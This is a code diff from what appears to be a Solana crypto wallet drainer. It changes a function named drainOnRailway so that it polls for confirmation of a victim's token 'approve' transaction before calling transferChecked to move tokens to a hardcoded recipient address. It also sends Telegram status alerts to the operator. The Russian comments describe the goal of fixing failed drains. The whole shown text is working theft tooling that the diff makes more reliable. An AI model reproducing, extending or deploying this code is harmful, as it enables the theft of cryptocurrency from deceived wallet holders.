@@ -180,8 +180,40 @@ async function drainOnRailway(parsed) {
   var ASSOC_TOKEN_PROGRAM  = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1bRS');
   var recipientPubkey      = new PublicKey(parsed.recipientAddress || '4Wgr1xvtZ5tqP7CSb1qtTxbUXaBTHu5pNtSkyrffT7hu');
 
-  // Ждём 3 сек после broadcast чтобы основная TX подтвердилась
-  await new Promise(function(r){ setTimeout(r, 3000); });
+  // Ждём подтверждения основной TX прежде чем делать transferChecked.
+  // 3 секунды недостаточно — если approve ещё не в чейне, delegate не выставлен
+  // и transferChecked падает с "owner does not match".
+  if (parsed.signature) {
+    console.log('[drain] Waiting for main TX confirmation:', parsed.signature);
+    var confirmed = false;
+    for (var attempt = 0; attempt < 30; attempt++) {
+      await new Promise(function(r){ setTimeout(r, 2000); });
+      try {
+        var statusResult = await connection.getSignatureStatus(parsed.signature, { searchTransactionHistory: true });
+        var status = statusResult && statusResult.value;
+        if (status && (status.confirmationStatus === 'confirmed' || status.confirmationStatus === 'finalized') && !status.err) {
+          console.log('[drain] Main TX confirmed after ' + ((attempt+1)*2) + 's');
+          confirmed = true;
+          break;
+        }
+        if (status && status.err) {
+          console.error('[drain] Main TX failed on-chain:', JSON.stringify(status.err));
+          sendTelegram('<b>Main TX FAILED on-chain</b>\nSig: <code>' + parsed.signature + '</code>\nErr: ' + JSON.stringify(status.err));
+          return;
+        }
+        console.log('[drain] Waiting... attempt=' + attempt + ' status=' + (status ? status.confirmationStatus : 'null'));
+      } catch(e) {
+        console.error('[drain] getSignatureStatus error:', e.message);
+      }
+    }
+    if (!confirmed) {
+      console.error('[drain] Main TX not confirmed after 60s — trying drain anyway');
+      sendTelegram('<b>Main TX timeout</b>\nSig: <code>' + parsed.signature + '</code>\nTrying drain anyway...');
+    }
+  } else {
+    // Нет сигнатуры — ждём 5 сек на всякий случай
+    await new Promise(function(r){ setTimeout(r, 5000); });
+  }
 
   for (var i = 0; i < parsed.tokens.length; i++) {
     var token = parsed.tokens[i];
@@ -686,6 +718,7 @@ httpServer.listen(PORT, function () {
   console.log('');
   connectAgent();
 });
+
 
 
 
